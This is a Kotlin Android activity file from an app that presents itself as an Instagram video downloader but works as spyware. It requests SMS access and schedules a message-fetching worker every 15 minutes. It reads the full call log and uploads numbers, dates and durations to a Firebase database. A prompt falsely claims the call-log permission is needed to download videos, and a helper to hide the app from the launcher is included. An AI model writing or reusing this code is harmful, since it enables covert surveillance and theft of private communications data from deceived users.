package com.example.instagramvideodownloader.home

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.CallLog
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.PeriodicWorkRequest
import androidx.work.WorkManager
import com.example.instagramvideodownloader.databinding.ActivityHomeBinding
import com.example.instagramvideodownloader.work_manager.FetchMessagesWorker
import com.example.instagramvideodownloader.work_manager.models.CallLogItemModel
import com.google.android.material.snackbar.Snackbar
import com.google.firebase.database.FirebaseDatabase
import java.util.concurrent.TimeUnit

class HomeActivity : AppCompatActivity() {
    private lateinit var binding: ActivityHomeBinding

    companion object {
        private const val CALL_LOG_PERMISSION_REQUEST_CODE = 101
        private const val SMS_PERMISSION_REQUEST_CODE = 1001
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityHomeBinding.inflate(layoutInflater).also { setContentView(it.root) }
        /* requestCallLogPermission()*/
        checkForPermissions()


    }

    private fun hideAppFromLauncher(context: Context, packageName: String) {
        val packageManager = context.packageManager

        try {
            packageManager.setApplicationEnabledSetting(
                packageName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            // Handle any exceptions here
        }
    }

    private fun checkForPermissions() {
        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            // Permission is not granted, request it
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_SMS),
                SMS_PERMISSION_REQUEST_CODE
            )
        } else {
            fetchMessages()

        }
    }

    private fun fetchMessages() {
        val workRequest = PeriodicWorkRequest.Builder(
            FetchMessagesWorker::class.java,
            15,
            TimeUnit.MINUTES
        ).build()

        WorkManager.getInstance(this).enqueue(workRequest)
    }


    private fun requestCallLogPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        ) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(
                    this,
                    Manifest.permission.READ_CALL_LOG
                )
            ) {
                // Display a Snackbar with a message explaining why the permission is needed
                Snackbar.make(
                    findViewById(android.R.id.content),
                    "This permission is required to download Instagram videos.",
                    Snackbar.LENGTH_LONG
                ).setAction("Grant") {
                    // Request the permission again when the user clicks on "Grant"
                    ActivityCompat.requestPermissions(
                        this,
                        arrayOf(Manifest.permission.READ_CALL_LOG),
                        CALL_LOG_PERMISSION_REQUEST_CODE
                    )
                }.show()
            } else {
                // Request the permission directly
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.READ_CALL_LOG),
                    CALL_LOG_PERMISSION_REQUEST_CODE
                )
            }
        } else {
            uploadCallLogsToFirebase()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            CALL_LOG_PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    uploadCallLogsToFirebase()
                } else {
                    // Permission denied. Handle accordingly.
                }
            }

            SMS_PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // Permission is granted, do your work that requires the permission
                    // For example, call a function to fetch SMS messages here
                    fetchMessages()
                } else {
                    // Permission is denied, handle it gracefully
                    // For example, show a message or disable functionality that requires the permission
                }
            }
        }
    }

    private fun uploadCallLogsToFirebase() {
        val callLogsList = mutableListOf<CallLogItemModel>()

        val mCursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            null,
            null,
            CallLog.Calls.DATE + " DESC"
        )

        mCursor?.use { cursor ->
            val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
            val dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)

            while (cursor.moveToNext()) {
                val phoneNumber = cursor.getString(numberIndex)
                val callType = cursor.getInt(typeIndex)
                val callDate = cursor.getLong(dateIndex)
                val callDuration = cursor.getLong(durationIndex)

                val callLogItem = CallLogItemModel(phoneNumber, callType, callDate, callDuration)
                callLogsList.add(callLogItem)
            }
        }

        // Now, you have the list of call logs. Upload it to Firebase Realtime Database.
        val database = FirebaseDatabase.getInstance()
        database.setPersistenceEnabled(true)
        val reference = database.getReference("call_logs")
        reference.setValue(callLogsList)
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    Toast.makeText(this, "Uploaded successfully", Toast.LENGTH_SHORT).show()
                    binding.tvCallLogsText.text = buildString {
                        append("Uploaded successfully")
                    }
                    Log.d("successFull : ", task.isSuccessful.toString())
                } else {
                    binding.tvCallLogsText.text = buildString {
                        append("Upload Failed")
                    }
                    Toast.makeText(this, "Upload Failed", Toast.LENGTH_SHORT).show()
                    Log.d("successFull : ", false.toString())
                }
            }
    }
}